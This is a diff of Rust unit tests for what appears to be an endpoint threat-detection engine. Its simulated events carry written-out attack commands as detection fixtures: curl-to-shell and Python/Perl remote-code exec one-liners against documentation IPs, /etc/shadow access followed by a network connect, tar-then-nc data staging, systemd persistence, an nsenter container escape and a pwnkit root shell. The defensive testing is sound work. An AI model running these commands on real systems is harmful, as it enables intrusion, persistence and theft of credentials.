@@ -18,7 +18,7 @@ fn event(ts: i64, class: EventClass, process: &str, parent: &str, uid: u32) -> T
         file_write: false,
         file_hash: None,
         dst_port: None,
-        dst_ip: None,
+        dst_ip: (class == EventClass::NetworkConnect).then(|| "198.51.100.7".into()),
         dst_domain: None,
         command_line: None,
         event_size: None,
@@ -31,6 +31,8 @@ fn event(ts: i64, class: EventClass, process: &str, parent: &str, uid: u32) -> T
 
 fn temporal_cap_rule(name: &str) -> TemporalRule {
     TemporalRule {
+        level: crate::RuleLevel::High,
+        any_order: false,
         name: name.to_string(),
         stages: vec![
             TemporalStage {
@@ -48,6 +50,7 @@ fn temporal_cap_rule(name: &str) -> TemporalRule {
                     command_line_contains: None,
                     require_file_write: false,
                     require_credential_source: false,
+                ..Default::default()
                 },
                 within_secs: 30,
             },
@@ -66,6 +69,7 @@ fn temporal_cap_rule(name: &str) -> TemporalRule {
                     command_line_contains: None,
                     require_file_write: false,
                     require_credential_source: false,
+                ..Default::default()
                 },
                 within_secs: 10,
             },
@@ -268,6 +272,7 @@ fn confidence_ordering_matches_policy() {
     let mut s = base.clone();
     s.z2_temporal = true;
     s.l1_prefilter_hit = true;
+    s.l1_named_hit = true;
     assert_eq!(confidence_policy(&s), Confidence::VeryHigh);
 
     let mut s = base.clone();
@@ -462,16 +467,16 @@ fn temporal_engine_detects_webshell_pattern() {
 fn temporal_engine_detects_privilege_escalation_pattern() {
     let mut t = TemporalEngine::with_default_rules();
 
-    let mut e1 = event(10, EventClass::ProcessExec, "sudo", "sshd", 1000);
+    let mut e1 = event(10, EventClass::ProcessExec, "pwnkit", "bash", 1000);
     e1.pid = 220;
     e1.session_id = 220;
     assert!(t.observe(&e1).is_empty());
 
-    let mut e2 = event(20, EventClass::ProcessExec, "bash", "sudo", 0);
+    let mut e2 = event(20, EventClass::ProcessExec, "bash", "pwnkit", 0);
     e2.pid = 220;
     e2.session_id = 220;
     let hits = t.observe(&e2);
-    assert!(hits.iter().any(|h| h == "phi_priv_esc"));
+    assert!(hits.iter().any(|h| h == "phi_unbrokered_root_shell"));
 }
 
 #[test]
@@ -570,14 +575,16 @@ fn temporal_engine_detects_download_exec_then_shell() {
     let mut downloader = event(40, EventClass::ProcessExec, "curl", "bash", 1000);
     downloader.pid = 241;
     downloader.session_id = 241;
+    downloader.command_line = Some("curl -fsSL https://198.51.100.7/install".into());
     assert!(t.observe(&downloader).is_empty());
 
-    let mut shell = event(55, EventClass::ProcessExec, "sh", "curl", 1000);
-    shell.pid = 241;
+    let mut shell = event(45, EventClass::ProcessExec, "sh", "curl", 1000);
+    shell.pid = 242;
+    shell.command_line = Some("sh".into());
     shell.session_id = 241;
 
     let hits = t.observe(&shell);
-    assert!(hits.iter().any(|h| h == "phi_download_exec"));
+    assert!(hits.iter().any(|h| h == "phi_download_pipe_shell"));
 }
 
 // Hypervisor guest agents (qemu-ga) probe the guest with python3 imports and
@@ -612,17 +619,17 @@ fn temporal_engine_detects_interpreter_download_then_shell() {
     for (process, cmdline) in [
         (
             "python3",
-            "python3 -c import urllib.request; urllib.request.urlretrieve('http://198.51.100.9/x', '/tmp/x')",
+            "python3 -c import urllib.request; exec(urllib.request.urlopen('http://198.51.100.9/x').read())",
         ),
-        ("perl", "perl -MLWP::Simple -e getstore('198.51.100.9/x','/tmp/x')"),
+        ("perl", r#"perl -e 'use LWP::Simple;system(get("http://198.51.100.9/x"))'"#),
     ] {
         let mut t = TemporalEngine::with_default_rules();
         let mut downloader = event(40, EventClass::ProcessExec, process, "bash", 1000);
         downloader.command_line = Some(cmdline.to_string());
-        assert!(t.observe(&downloader).is_empty());
+        assert!(t.observe(&downloader).iter().any(|h| h == "phi_interpreter_download_exec"));
         let shell = event(50, EventClass::ProcessExec, "sh", "bash", 1000);
         assert!(
-            t.observe(&shell).iter().any(|h| h == "phi_download_exec"),
+            !t.observe(&shell).iter().any(|h| h == "phi_download_pipe_shell"),
             "{process} download did not raise phi_download_exec"
         );
     }
@@ -633,13 +640,13 @@ fn temporal_engine_detects_interpreter_download_then_shell() {
 fn temporal_engine_detects_credential_exfil_rule() {
     let mut t = TemporalEngine::with_default_rules();
 
-    let mut file_access = event(60, EventClass::FileOpen, "cat", "bash", 1000);
+    let mut file_access = event(60, EventClass::FileOpen, "curl", "bash", 1000);
     file_access.pid = 242;
     file_access.session_id = 242;
     file_access.file_path = Some("/etc/shadow".to_string());
-    assert!(t.observe(&file_access).is_empty());
+    assert!(!t.observe(&file_access).iter().any(|h| h == "phi_credential_exfil"));
 
-    let mut connect = event(70, EventClass::NetworkConnect, "cat", "bash", 1000);
+    let mut connect = event(70, EventClass::NetworkConnect, "curl", "bash", 1000);
     connect.pid = 242;
     connect.session_id = 242;
     connect.dst_port = Some(9001);
@@ -653,10 +660,10 @@ fn temporal_engine_detects_credential_exfil_rule() {
 fn temporal_engine_persistence_install_requires_file_write() {
     let mut t = TemporalEngine::with_default_rules();
 
-    let mut no_write = event(80, EventClass::FileOpen, "vim", "bash", 1000);
+    let mut no_write = event(80, EventClass::FileOpen, "bash", "bash", 1000);
     no_write.pid = 243;
     no_write.session_id = 243;
-    no_write.file_path = Some("/home/user/.bashrc".to_string());
+    no_write.file_path = Some("/home/user/.config/systemd/user/x.service".to_string());
     no_write.file_write = false;
     assert!(t.observe(&no_write).is_empty());
 
@@ -666,15 +673,16 @@ fn temporal_engine_persistence_install_requires_file_write() {
     let misses = t.observe(&exec_after_no_write);
     assert!(misses.iter().all(|h| h != "phi_persistence_install"));
 
-    let mut with_write = event(100, EventClass::FileOpen, "vim", "bash", 1000);
+    let mut with_write = event(100, EventClass::FileOpen, "bash", "bash", 1000);
     with_write.pid = 244;
     with_write.session_id = 244;
-    with_write.file_path = Some("/home/user/.bashrc".to_string());
+    with_write.file_path = Some("/home/user/.config/systemd/user/x.service".to_string());
     with_write.file_write = true;
-    assert!(t.observe(&with_write).is_empty());
+    assert!(t.observe(&with_write).iter().any(|h| h == "phi_persistence_write"));
 
-    let mut exec_after_write = event(110, EventClass::ProcessExec, "bash", "vim", 1000);
-    exec_after_write.pid = 244;
+    let mut exec_after_write = event(110, EventClass::ProcessExec, "systemctl", "bash", 1000);
+    exec_after_write.pid = 245;
+    exec_after_write.command_line = Some("systemctl --user enable --now x".into());
     exec_after_write.session_id = 244;
     let hits = t.observe(&exec_after_write);
     assert!(hits.iter().any(|h| h == "phi_persistence_install"));
@@ -682,7 +690,7 @@ fn temporal_engine_persistence_install_requires_file_write() {
 
 #[test]
 // AC-DET-254
-fn temporal_engine_detects_ssh_lateral_rule() {
+fn temporal_engine_does_not_label_normal_ssh_lateral() {
     let mut t = TemporalEngine::with_default_rules();
 
     let mut key_access = event(120, EventClass::FileOpen, "ssh", "bash", 1000);
@@ -697,7 +705,7 @@ fn temporal_engine_detects_ssh_lateral_rule() {
     ssh_connect.dst_port = Some(22);
 
     let hits = t.observe(&ssh_connect);
-    assert!(hits.iter().any(|h| h == "phi_ssh_lateral"));
+    assert!(hits.is_empty());
 }
 
 #[test]
@@ -705,14 +713,14 @@ fn temporal_engine_detects_ssh_lateral_rule() {
 fn temporal_engine_detects_data_staging_rule() {
     let mut t = TemporalEngine::with_default_rules();
 
-    let mut archive = event(150, EventClass::ProcessExec, "bash", "systemd", 1000);
+    let mut archive = event(150, EventClass::ProcessExec, "tar", "bash", 1000);
     archive.pid = 246;
     archive.session_id = 246;
-    archive.command_line = Some("tar czf /tmp/stage.tgz /srv/data".to_string());
+    archive.command_line = Some("tar czf /tmp/stage.tgz /home/user/docs".to_string());
     assert!(t.observe(&archive).is_empty());
 
-    let mut exfil = event(200, EventClass::NetworkConnect, "bash", "systemd", 1000);
-    exfil.pid = 246;
+    let mut exfil = event(200, EventClass::NetworkConnect, "nc", "bash", 1000);
+    exfil.pid = 247;
     exfil.session_id = 246;
     exfil.dst_port = Some(8444);
 
@@ -920,7 +928,8 @@ fn temporal_engine_eviction_counters_track_retention_and_capacity_reasons() {
 #[test]
 // AC-DET-024 AC-DET-119
 fn temporal_engine_prunes_stale_state_and_pid_metadata_after_retention_horizon() {
-    let mut t = TemporalEngine::with_default_rules();
+    let mut t = TemporalEngine::new();
+    t.add_rule(temporal_cap_rule("phi_webshell"));
 
     let mut stale_stage1 = event(100, EventClass::ProcessExec, "bash", "nginx", 33);
     stale_stage1.pid = 990;
@@ -1115,10 +1124,22 @@ fn anomaly_engine_flags_distribution_shift() {
     }
 }
 
+fn webshell_graph_fixture() -> Layer4Engine {
+    let mut l4 = Layer4Engine::new(300);
+    l4.add_template(KillChainTemplate {
+        name: "killchain_webshell_network".into(),
+        stages: vec![
+            TemplatePredicate { process_any_of: Some(crate::util::set_of(["nginx"])), ..Default::default() },
+            TemplatePredicate { process_any_of: Some(crate::util::set_of(["bash"])), require_network_non_web: true, ..Default::default() },
+        ],
+        max_depth: 4, max_inter_stage_secs: 30,
+    });
+    l4
+}
+
 #[test]
-// AC-DET-050 AC-DET-051 AC-DET-088
-fn layer4_matches_default_template() {
-    let mut l4 = Layer4Engine::with_default_templates();
+fn layer4_matches_explicit_webshell_template() {
+    let mut l4 = webshell_graph_fixture();
     l4.configure_control_plane(std::process::id(), vec![("198.51.100.7".into(), 9001)]);
 
     let mut parent = event(1, EventClass::ProcessExec, "nginx", "systemd", 33);
@@ -1197,7 +1218,7 @@ fn layer4_ptrace_fileless_chain_triggers() {
 
 #[test]
 // AC-DET-237
-fn layer4_userfaultfd_execveat_chain_triggers() {
+fn layer4_retires_userfaultfd_execveat_test_artifact() {
     let mut l4 = Layer4Engine::with_default_templates();
 
     let mut parent = event(1, EventClass::ProcessExec, "python", "systemd", 1000);
@@ -1213,9 +1234,7 @@ fn layer4_userfaultfd_execveat_chain_triggers() {
     child.session_id = child.pid;
     child.command_line = Some("execveat /proc/self/fd/7".to_string());
     let hits = l4.observe(&child);
-    assert!(hits
-        .iter()
-        .any(|h| h == "killchain_exploit_userfaultfd_execveat"));
+    assert!(hits.is_empty());
 }
 
 #[test]
@@ -1228,6 +1247,7 @@ fn layer4_proc_mem_fileless_chain_triggers() {
     parent.ppid = 1;
     parent.session_id = parent.pid;
     parent.file_path = Some("/proc/4242/mem".to_string());
+    parent.file_write = true;
     let _ = l4.observe(&parent);
 
     let mut child = event(2, EventClass::ProcessExec, "bash", "bash", 1000);
@@ -1244,7 +1264,7 @@ fn layer4_proc_mem_fileless_chain_triggers() {
 #[test]
 // AC-DET-050 AC-DET-088
 fn layer4_hit_is_scoped_to_current_event_lineage_and_does_not_replay_on_unrelated_events() {
-    let mut l4 = Layer4Engine::with_default_templates();
+    let mut l4 = webshell_graph_fixture();
 
     let mut parent = event(1, EventClass::ProcessExec, "nginx", "systemd", 33);
     parent.pid = 50;
@@ -1282,7 +1302,7 @@ fn layer4_hit_is_scoped_to_current_event_lineage_and_does_not_replay_on_unrelate
 #[test]
 // AC-DET-050 AC-DET-088
 fn layer4_pid_reuse_does_not_inherit_stale_non_web_network_signal() {
-    let mut l4 = Layer4Engine::with_default_templates();
+    let mut l4 = webshell_graph_fixture();
 
     let mut parent = event(1, EventClass::ProcessExec, "nginx", "systemd", 33);
     parent.pid = 60;
@@ -1459,6 +1479,7 @@ fn layer4_template_matching_is_bounded_by_declared_depth() {
                 require_execveat_activity: false,
                 require_proc_mem_access: false,
                 require_fileless_exec: false,
+                ..Default::default()
             },
             TemplatePredicate {
                 process_any_of: Some(crate::util::set_of(["mid"])),
@@ -1475,6 +1496,7 @@ fn layer4_template_matching_is_bounded_by_declared_depth() {
                 require_execveat_activity: false,
                 require_proc_mem_access: false,
                 require_fileless_exec: false,
+                ..Default::default()
             },
             TemplatePredicate {
                 process_any_of: Some(crate::util::set_of(["leaf"])),
@@ -1491,6 +1513,7 @@ fn layer4_template_matching_is_bounded_by_declared_depth() {
                 require_execveat_activity: false,
                 require_proc_mem_access: false,
                 require_fileless_exec: false,
+                ..Default::default()
             },
         ],
         max_depth: 1,
@@ -1573,6 +1596,7 @@ fn layer4_evaluation_runtime_is_bounded_with_depth_limited_templates() {
                     require_execveat_activity: false,
                     require_proc_mem_access: false,
                     require_fileless_exec: false,
+                ..Default::default()
                 },
                 TemplatePredicate {
                     process_any_of: Some(std::iter::once("never-match".to_string()).collect()),
@@ -1589,6 +1613,7 @@ fn layer4_evaluation_runtime_is_bounded_with_depth_limited_templates() {
                     require_execveat_activity: false,
                     require_proc_mem_access: false,
                     require_fileless_exec: false,
+                ..Default::default()
                 },
             ],
             max_depth: 6,
@@ -1631,39 +1656,27 @@ fn engine_runs_all_layers() {
 
 #[test]
 // AC-DET-241
-fn detection_allowlist_short_circuits_known_good_processes() {
+fn detection_allowlist_never_suppresses_exact_ioc() {
     let mut d = DetectionEngine::default_with_rules();
-    d.layer1.load_hashes(["deadbeef".to_string()]);
-    d.allowlist.add_allowed_process("trusted-agent".to_string());
-
+    d.layer1.load_hashes(["deadbeef".into()]);
+    d.allowlist.add_allowed_process("/opt/vendor/trusted-agent".into());
     let mut ev = event(2, EventClass::ProcessExec, "trusted-agent", "init", 1000);
-    ev.file_hash = Some("deadbeef".to_string());
-    ev.session_id = ev.pid;
+    ev.file_path = Some("/opt/vendor/trusted-agent".into());
+    ev.file_hash = Some("deadbeef".into());
     let out = d.process_event(&ev);
-
-    assert_eq!(out.confidence, Confidence::None);
-    assert!(!out.signals.z1_exact_ioc);
-    assert!(!out.signals.z2_temporal);
-    assert!(!out.signals.z3_anomaly_high);
-    assert!(!out.signals.z3_anomaly_med);
-    assert!(!out.signals.z4_kill_chain);
-    assert!(!out.signals.l1_prefilter_hit);
-    assert!(!out.signals.exploit_indicator);
-    assert!(!out.signals.kernel_integrity);
-    assert!(!out.signals.tamper_indicator);
-    assert!(out.temporal_hits.is_empty());
-    assert!(out.kill_chain_hits.is_empty());
-    assert!(out.exploit_indicators.is_empty());
-    assert!(out.kernel_integrity_indicators.is_empty());
-    assert!(out.tamper_indicators.is_empty());
-    assert!(out.yara_hits.is_empty());
-    assert!(out.ml_score.is_none());
+    assert_eq!(out.confidence, Confidence::Definite);
+    assert!(out.signals.z1_exact_ioc);
 }
 
 #[test]
 // AC-DET-190 AC-DET-191 AC-DET-192 AC-DET-193
-fn ransomware_write_burst_triggers_killchain_and_ignores_sparse_writes() {
-    let mut l4 = Layer4Engine::with_default_templates();
+fn explicit_ransomware_template_tests_burst_algorithm_not_production_admission() {
+    let mut l4 = Layer4Engine::new(300);
+    l4.add_template(KillChainTemplate {
+        name: "killchain_ransomware_write_burst".into(),
+        stages: vec![TemplatePredicate { require_ransomware_write_burst: true, ..Default::default() }],
+        max_depth: 2, max_inter_stage_secs: 15,
+    });
 
     for i in 0..10 {
         let mut ev = event(i, EventClass::FileOpen, "python", "systemd", 1000);
@@ -1759,6 +1772,7 @@ fn ransomware_write_burst_triggers_killchain_and_ignores_sparse_writes() {
             require_execveat_activity: false,
             require_proc_mem_access: false,
             require_fileless_exec: false,
+                ..Default::default()
         }],
         max_depth: 2,
         max_inter_stage_secs: 15,
@@ -1824,6 +1838,8 @@ fn container_escape_killchain_triggers() {
     ev.container_runtime = Some("docker".to_string());
     ev.container_id = Some("deadbeefdead".to_string());
     ev.container_escape = true;
+    ev.process = "nsenter".into();
+    ev.command_line = Some("nsenter -t 1 -m -u -i -n sh".into());
 
     let hits = l4.observe(&ev);
     assert!(
@@ -1834,7 +1850,7 @@ fn container_escape_killchain_triggers() {
 
 #[test]
 // AC-DET-211
-fn privileged_container_killchain_triggers() {
+fn privileged_container_posture_is_not_an_escape() {
     let mut l4 = Layer4Engine::with_default_templates();
     let mut ev = event(20, EventClass::ProcessExec, "sleep", "init", 0);
     ev.pid = 5252;
@@ -1846,7 +1862,7 @@ fn privileged_container_killchain_triggers() {
 
     let hits = l4.observe(&ev);
     assert!(
-        hits.iter().any(|h| h == "killchain_container_privileged"),
+        hits.is_empty(),
         "privileged container should trigger killchain"
     );
     ev.event_class = EventClass::FileOpen;
@@ -1862,12 +1878,12 @@ fn privileged_container_killchain_triggers() {
     assert!(l4.observe(&ev).is_empty());
     ev.ts_unix = 42;
     ev.container_privileged = true;
-    assert_eq!(l4.observe(&ev), vec!["killchain_container_privileged"]);
+    assert!(l4.observe(&ev).is_empty());
 }
 
 #[test]
 // AC-DET-212
-fn credential_theft_killchain_triggers_on_sensitive_paths() {
+fn credential_access_does_not_duplicate_temporal_rules_on_sensitive_paths() {
     let mut l4 = Layer4Engine::with_default_templates();
 
     let mut shadow = event(10, EventClass::FileOpen, "cat", "bash", 1000);
@@ -1877,7 +1893,7 @@ fn credential_theft_killchain_triggers_on_sensitive_paths() {
     shadow.file_path = Some("/etc/shadow".to_string());
     let hits = l4.observe(&shadow);
     assert!(
-        hits.iter().any(|h| h == "killchain_credential_theft"),
+        hits.is_empty(),
         "credential theft should trigger on /etc/shadow"
     );
 
@@ -1888,7 +1904,7 @@ fn credential_theft_killchain_triggers_on_sensitive_paths() {
     key.file_path = Some("/root/.ssh/id_rsa".to_string());
     let hits = l4.observe(&key);
     assert!(
-        hits.iter().any(|h| h == "killchain_credential_theft"),
+        hits.is_empty(),
         "credential theft should trigger on SSH private keys"
     );
 }
@@ -1955,7 +1971,7 @@ fn credential_theft_killchain_ignores_expected_unix_chkpwd_shadow_access() {
 
 #[test]
 // AC-DET-214
-fn credential_theft_killchain_triggers_on_windows_paths() {
+fn credential_access_does_not_duplicate_temporal_rules_on_windows_paths() {
     let mut l4 = Layer4Engine::with_default_templates();
 
     let mut ev = event(13, EventClass::FileOpen, "powershell", "explorer", 1000);
@@ -1966,14 +1982,14 @@ fn credential_theft_killchain_triggers_on_windows_paths() {
 
     let hits = l4.observe(&ev);
     assert!(
-        hits.iter().any(|h| h == "killchain_credential_theft"),
+        hits.is_empty(),
         "windows SAM access should trigger credential theft killchain"
     );
 }
 
 #[test]
 // AC-DET-215
-fn credential_theft_killchain_triggers_on_macos_paths() {
+fn credential_access_does_not_duplicate_temporal_rules_on_macos_paths() {
     let mut l4 = Layer4Engine::with_default_templates();
 
     let mut ev = event(14, EventClass::FileOpen, "security", "launchd", 1000);
@@ -1984,7 +2000,7 @@ fn credential_theft_killchain_triggers_on_macos_paths() {
 
     let hits = l4.observe(&ev);
     assert!(
-        hits.iter().any(|h| h == "killchain_credential_theft"),
+        hits.is_empty(),
         "macOS keychain access should trigger credential theft killchain"
     );
 }
@@ -2384,7 +2400,7 @@ detection:
 }
 
 #[test]
-fn yara_rule_match_escalates_to_definite() {
+fn uncurated_substring_yara_never_drives_confidence() {
     let mut engine = DetectionEngine::default_with_rules();
     engine
         .load_yara_rules_str(
@@ -2417,11 +2433,8 @@ rule suspicious_payload {
     let out = engine.process_event(&ev);
 
     // Standalone YARA hit → High (not Definite, which is reserved for IOC exact matches)
-    assert_eq!(out.confidence, Confidence::High);
-    assert!(out
-        .yara_hits
-        .iter()
-        .any(|hit| hit.rule_name == "suspicious_payload"));
+    assert!(out.confidence < Confidence::High);
+    assert!(out.yara_hits.is_empty());
     let _ = std::fs::remove_dir_all(tmp_dir);
 }
 
@@ -2434,7 +2447,7 @@ fn exact_ioc_file_match_preserves_yara_hits_for_known_malware() {
     engine
         .load_yara_rules_str(
             r#"
-rule eicar_signature {
+rule eguard_eicar_test {
   strings:
     $eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
   condition:
@@ -2473,7 +2486,7 @@ rule eicar_signature {
     assert!(out
         .yara_hits
         .iter()
-        .any(|hit| hit.rule_name == "eicar_signature"));
+        .any(|hit| hit.rule_name == "eguard_eicar_test"));
 
     let _ = std::fs::remove_dir_all(tmp_dir);
 }
@@ -2897,7 +2910,7 @@ fn build_adversarial_replay_corpus() -> (Vec<LabeledReplayEvent>, usize) {
         stage1.session_id = stage1.pid;
         corpus.push(labeled_event(stage1, None));
 
-        let mut stage2 = event(base + 5, EventClass::ProcessExec, "su", "bash", 0);
+        let mut stage2 = event(base + 5, EventClass::ProcessExec, "sh", "exploit", 0);
         stage2.pid = pid;
         stage2.session_id = stage2.pid;
         corpus.push(labeled_event(stage2, Some(Confidence::High)));
@@ -2908,13 +2921,13 @@ fn build_adversarial_replay_corpus() -> (Vec<LabeledReplayEvent>, usize) {
         miss_stage1.session_id = miss_stage1.pid;
         corpus.push(labeled_event(miss_stage1, None));
 
-        let mut miss_stage2 = event(base + 35, EventClass::ProcessExec, "su", "bash", 0);
+        let mut miss_stage2 = event(base + 35, EventClass::ProcessExec, "sh", "exploit", 0);
         miss_stage2.pid = miss_pid;
         miss_stage2.session_id = miss_stage2.pid;
         corpus.push(labeled_event(miss_stage2, None));
     }
 
-    // Scenario 3: dual-signal webshell chains (temporal + killchain) and close benign lookalikes.
+    // Scenario 3: canonical webshell chains (duplicates are not independent signals) and close benign lookalikes.
     for seq in 0..2i64 {
         let base = 2_000 + seq * 60;
         let parent_pid = 30_000 + (seq as u32) * 20;
@@ -2937,7 +2950,7 @@ fn build_adversarial_replay_corpus() -> (Vec<LabeledReplayEvent>, usize) {
         net.ppid = parent_pid;
         net.session_id = net.pid;
         net.dst_port = Some(9001);
-        corpus.push(labeled_event(net, Some(Confidence::VeryHigh)));
+        corpus.push(labeled_event(net, Some(Confidence::High)));
 
         let benign_parent_pid = parent_pid + 10;
         let benign_child_pid = benign_parent_pid + 1;
@@ -2959,6 +2972,7 @@ fn build_adversarial_replay_corpus() -> (Vec<LabeledReplayEvent>, usize) {
         benign_net.ppid = benign_parent_pid;
         benign_net.session_id = benign_net.pid;
         benign_net.dst_port = Some(443);
+        benign_net.dst_ip = Some("127.0.0.1".into());
         corpus.push(labeled_event(benign_net, None));
     }
 
@@ -3018,7 +3032,7 @@ fn build_adversarial_replay_corpus() -> (Vec<LabeledReplayEvent>, usize) {
         malicious_net.ppid = parent_pid;
         malicious_net.session_id = malicious_net.pid;
         malicious_net.dst_port = Some(9001);
-        corpus.push(labeled_event(malicious_net, Some(Confidence::VeryHigh)));
+        corpus.push(labeled_event(malicious_net, Some(Confidence::High)));
 
         let mut reused_pid_exec = event(base + 20, EventClass::ProcessExec, "bash", "nginx", 33);
         reused_pid_exec.pid = child_pid;
@@ -3031,6 +3045,7 @@ fn build_adversarial_replay_corpus() -> (Vec<LabeledReplayEvent>, usize) {
         benign_net.ppid = parent_pid;
         benign_net.session_id = benign_net.pid;
         benign_net.dst_port = Some(443);
+        benign_net.dst_ip = Some("127.0.0.1".into());
         corpus.push(labeled_event(benign_net, None));
     }
 
@@ -3278,7 +3293,7 @@ fn build_adversarial_replay_corpus() -> (Vec<LabeledReplayEvent>, usize) {
         malicious_net.ppid = parent_pid;
         malicious_net.session_id = malicious_net.pid;
         malicious_net.dst_port = Some(9001);
-        corpus.push(labeled_event(malicious_net, Some(Confidence::VeryHigh)));
+        corpus.push(labeled_event(malicious_net, Some(Confidence::High)));
 
         let mut exit = event(base + 6, EventClass::ProcessExit, "bash", "nginx", 33);
         exit.pid = child_pid;
@@ -3323,7 +3338,7 @@ fn build_adversarial_replay_corpus() -> (Vec<LabeledReplayEvent>, usize) {
         fresh_net.ppid = fresh_parent_pid;
         fresh_net.session_id = fresh_net.pid;
         fresh_net.dst_port = Some(9001);
-        corpus.push(labeled_event(fresh_net, Some(Confidence::VeryHigh)));
+        corpus.push(labeled_event(fresh_net, Some(Confidence::High)));
     }
 
     (corpus, 12)
@@ -3702,7 +3717,7 @@ fn temporal_engine_enforces_stage_window() {
     e1.pid = 300;
     assert!(t.observe(&e1).is_empty());
 
-    let mut e2 = event(111, EventClass::NetworkConnect, "bash", "nginx", 33);
+    let mut e2 = event(131, EventClass::NetworkConnect, "bash", "nginx", 33);
     e2.pid = 300;
     e2.dst_port = Some(8080);
 
@@ -3930,6 +3945,7 @@ fn confidence_policy_is_first_match_wins() {
         z3_anomaly_med: true,
         z4_kill_chain: true,
         l1_prefilter_hit: true,
+        l1_named_hit: true,
         exploit_indicator: false,
         kernel_integrity: false,
         tamper_indicator: false,
@@ -3945,6 +3961,7 @@ fn confidence_policy_is_first_match_wins() {
         z3_anomaly_med: true,
         z4_kill_chain: false,
         l1_prefilter_hit: true,
+        l1_named_hit: true,
         exploit_indicator: false,
         kernel_integrity: false,
         tamper_indicator: false,
